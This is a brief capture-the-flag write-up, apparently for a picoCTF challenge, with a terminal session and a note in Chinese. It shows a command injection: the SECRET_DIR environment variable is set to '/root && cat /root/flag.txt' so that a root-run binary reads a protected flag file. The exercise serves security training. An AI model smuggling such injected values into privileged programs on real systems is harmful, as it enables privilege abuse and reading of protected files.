
```
ctf-player@pico-chall$ ls
bin
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
ctf-player@pico-chall$ vim bin 
-bash: vim: command not found
ctf-player@pico-chall$ ./bin && cat /root/flag.txt
Listing the content of /root as root: 
flag.txt
cat: /root/flag.txt: Permission denied
ctf-player@pico-chall$ export SECRET_DIR="/root && cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of /root && cat /root/flag.txt as root: 
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}
```

執行後發現需要設定環境變數 `SECRET_DIR`，給定資料夾後發現用 `bin` 執行時有 root 權限，故想辦法把惡意字串塞進去，達成 command injection

```
export $SECRET_DIR=/root
export SECRET_DIR="/root && cat /root/flag.txt"
```
